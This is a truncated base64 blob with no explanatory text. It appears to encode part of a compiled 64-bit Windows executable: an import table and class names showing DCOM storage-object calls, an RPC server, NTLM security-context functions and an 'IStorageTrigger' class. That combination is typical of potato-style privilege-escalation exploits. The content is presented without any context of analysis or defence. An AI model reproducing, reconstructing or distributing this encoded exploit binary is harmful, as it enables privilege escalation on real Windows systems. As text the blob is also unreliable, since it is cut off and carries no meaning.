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AAAACS5AgAAAAAAPLkCAAAAAAAAAAAAAAAAAAIAAAAAAACADQAAAAAAAIAQuAIAAAAAAAC4AgAAAAAAdAAAAAAAAIABAAAAAAAAgHMAAAAAAACACwAAAAAAAIATAAAAAAAAgBcAAAAAAACABAAAAAAAAIAQAAAAAAAAgAkAAAAAAACAbwAAAAAAAIADAAAAAAAAgAAAAAAAAAAAnrcCAAAAAACKtwIAAAAAANq3AgAAAAAAaLcCAAAAAABWtwIAAAAAAES3AgAAAAAAeLcCAAAAAAC+twIAAAAAAAAAAAAAAAAAVQNIZWFwRnJlZQAAjwVTbGVlcABqAkdldExhc3RFcnJvcgAAUQNIZWFwQWxsb2MAvgJHZXRQcm9jZXNzSGVhcAAA6gVXYWl0Rm9yU2luZ2xlT2JqZWN0APUAQ3JlYXRlVGhyZWFkAAC4AkdldFByb2NBZGRyZXNzAACBAkdldE1vZHVsZUhhbmRsZVcAAEtFUk5FTDMyLmRsbAAAiwBDb1Rhc2tNZW1BbGxvYwAAEABDTFNJREZyb21TdHJpbmcAYABDb0luaXRpYWxpemUAAJAAQ29VbmluaXRpYWxpemUAACsAQ29DcmVhdGVJbnN0YW5jZQAA+wFTdGdDcmVhdGVEb2NmaWxlT25JTG9ja0J5dGVzAAClAENyZWF0ZUlMb2NrQnl0ZXNPbkhHbG9iYWwATABDb0dldEluc3RhbmNlRnJvbUlTdG9yYWdlAG9sZTMyLmRsbACkAGZyZWVhZGRyaW5mbwAApQBnZXRhZGRyaW5mbwBXUzJfMzIuZGxsAADeAENyeXB0U3RyaW5nVG9CaW5hcnlBAAB8AENyeXB0QmluYXJ5VG9TdHJpbmdBAABDUllQVDMyLmRsbADcAVJwY1NlcnZlclJlZ2lzdGVyQXV0aEluZm9BAADfAVJwY1NlcnZlclJlZ2lzdGVySWYyAACSAVJwY0VwUmVnaXN0ZXJBAADbAVJwY1NlcnZlckxpc3RlbgDsAVJwY1NlcnZlclVzZVByb3RzZXFFcEEAAM4BUnBjU2VydmVySW5xQmluZGluZ3MAADIBTmRyU2VydmVyQ2FsbEFsbAAAMQFOZHJTZXJ2ZXJDYWxsMgAAUlBDUlQ0LmRsbAAAAABBY2NlcHRTZWN1cml0eUNvbnRleHQAAgBBY3F1aXJlQ3JlZGVudGlhbHNIYW5kbGVXAFNlY3VyMzIuZGxsANUEUnRsQ2FwdHVyZUNvbnRleHQA3ARSdGxMb29rdXBGdW5jdGlvbkVudHJ5AADjBFJ0bFZpcnR1YWxVbndpbmQAAMAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAB/BVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAgAkdldEN1cnJlbnRQcm9jZXNzAJ4FVGVybWluYXRlUHJvY2VzcwAAjANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AFIEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAIQJHZXRDdXJyZW50UHJvY2Vzc0lkACUCR2V0Q3VycmVudFRocmVhZElkAADzAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAG8DSW5pdGlhbGl6ZVNMaXN0SGVhZACFA0lzRGVidWdnZXJQcmVzZW50ANoCR2V0U3RhcnR1cEluZm9XANYDTG9jYWxGcmVlAK8BRm9ybWF0TWVzc2FnZUEAAOIEUnRsVW53aW5kRXgA3gRSdGxQY1RvRmlsZUhlYWRlcgBoBFJhaXNlRXhjZXB0aW9uAABBBVNldExhc3RFcnJvcgAANAFFbmNvZGVQb2ludGVyADgBRW50ZXJDcml0aWNhbFNlY3Rpb24AAMQDTGVhdmVDcml0aWNhbFNlY3Rpb24AABQBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAGsDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudACwBVRsc0FsbG9jAACyBVRsc0dldFZhbHVlALMFVGxzU2V0VmFsdWUAsQVUbHNGcmVlALQBRnJlZUxpYnJhcnkAygNMb2FkTGlicmFyeUV4VwAAZwFFeGl0UHJvY2VzcwCAAkdldE1vZHVsZUhhbmRsZUV4VwAA3AJHZXRTdGRIYW5kbGUAACUGV3JpdGVGaWxlAH0CR2V0TW9kdWxlRmlsZU5hbWVXAADfAUdldENvbW1hbmRMaW5lQQDgAUdldENvbW1hbmRMaW5lVwCeAENvbXBhcmVTdHJpbmdXAAC4A0xDTWFwU3RyaW5nVwAAWAJHZXRGaWxlVHlwZQARBldpZGVDaGFyVG9NdWx0aUJ5dGUAfgFGaW5kQ2xvc2UAhAFGaW5kRmlyc3RGaWxlRXhXAACVAUZpbmROZXh0RmlsZVcAkgNJc1ZhbGlkQ29kZVBhZ2UAuwFHZXRBQ1AAAKECR2V0T0VNQ1AAAMoBR2V0Q1BJbmZvAPYDTXVsdGlCeXRlVG9XaWRlQ2hhcgBBAkdldEVudmlyb25tZW50U3RyaW5nc1cAALMBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAJAVTZXRFbnZpcm9ubWVudFZhcmlhYmxlVwBbBVNldFN0ZEhhbmRsZQAA4QJHZXRTdHJpbmdUeXBlVwAAqAFGbHVzaEZpbGVCdWZmZXJzAAAJAkdldENvbnNvbGVPdXRwdXRDUAAABQJHZXRDb25zb2xlTW9kZQAAVgJHZXRGaWxlU2l6ZUV4ADMFU2V0RmlsZVBvaW50ZXJFeAAAWgNIZWFwU2l6ZQAAWANIZWFwUmVBbGxvYwCJAENsb3NlSGFuZGxlAM4AQ3JlYXRlRmlsZVcAJAZXcml0ZUNvbnNvbGVXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM1dINJm1P//MqLfLZkrAAD/////AQAAAAEAAAACAAAALyAAAAAAAAAA+AAAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAwAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//////////8AAAAAAAAAAIAACgoKAAAAAAAAAAAAAAD/////AAAAAOAOAkABAAAAAQAAAAAAAAABAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABjDAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGMMCQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYwwJAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABjDAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGMMCQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcMgCQAEAAAAAAAAAAAAAAAAAAAAAAAAAYBECQAEAAADgEgJAAQAAAGAHAkABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsMECQAEAAAAwwwJAAQAAAEMAAAAAAAAA4hMCQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQAAAAAAAAICAgICAgICAgICAgICAgICAgICAgICAgICAAAAAAAAAAAAAAAAAAAAAAA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RoAACobAABgmwIAKhsAAEYbAAB0mwIARhsAAFYbAACEmwIAVhsAAF4bAACYmwIAgBsAAJ0bAAComwIAoBsAAH0eAACwmwIAkB4AAKUeAAComwIAsB4AANAeAADYmwIA0B4AAPgeAADYmwIAAB8AACgfAADYmwIAMB8AAEUfAAComwIAUB8AAHAfAADYmwIAcB8AAI4fAADYmwIAkB8AAMUfAADgmwIA0B8AAPgfAADYmwIAACAAAHwgAADomwIAMCEAAO0hAAD8mwIA7SEAAMkiAAAQnAIAySIAAAEjAAAonAIAASMAAJgjAAA4nAIAmCMAAMYjAABMnAIA0CMAACMkAABknAIAIyQAAGMkAAB4nAIAYyQAAAwlAACQnAIADCUAAIYlAACknAIAhiUAAKAlAAC0nAIAoCUAANIlAADEnAIAACYAAEImAADMnAIAoCYAAMAmAADgmwIAwCYAAPwmAADEnAIAACcAADwnAADEnAIAQCcAAFEnAAComwIAcCcAAK8nAADYnAIA8CcAAD0oAADEnAIAQCgAAGEoAADEnAIAgCgAABQpAADgnAIAICkAAHIpAAAQnQIAgCkAALQvAAAsnQIAwC8AABgxAABUnQIAIDEAADwxAAComwIAQDEAAGgxAADYmwIAcDEAALkzAABknQIAwDMAAPgzAAComwIAEDQAAJs0AACEnQIAmzQAAFo1AACUnQIAWjUAAGY1AAConQIAZjUAAGw1AAC8nQIAcDUAAMc1AADMnQIA0DUAAOc1AAComwIA8DUAAAc2AAComwIAEDYAACc2AAComwIAMDYAAEc2AAComwIAUDYAAFs4AADcnQIAYDgAAHc4AAComwIAoDgAAHM5AAAAngIAczkAABU7AAAgngIAFTsAAPg8AAA0ngIAAD0AAAQ+AABEngIABD4AAA8/AABcngIADz8AADU/AABwngIAUD8AAG4/AACAngIAcD8AAKQ/AADEnAIApD8AAHZAAACEngIAeEAAAOlAAACMngIA7EAAABdBAADEnAIAGEEAAFRBAADEnAIAXEEAABJCAADEnAIAFEIAACRCAAComwIAJEIAAD1CAAComwIAQEIAALxDAACYngIAvEMAAM5DAAComwIA8EMAABBEAADgmwIAEEQAAElEAAComwIATEQAAJVEAADEnAIAmEQAACNFAADEnAIAJEUAALxFAADYngIAvEUAAOBFAADEnAIA4EUAAAlGAADEnAIADEYAAEZGAADEnAIASEYAAF9GAAComwIAYEYAAAxHAAAAnwIAPEcAAFdHAAComwIAfEcAAMdIAAAMnw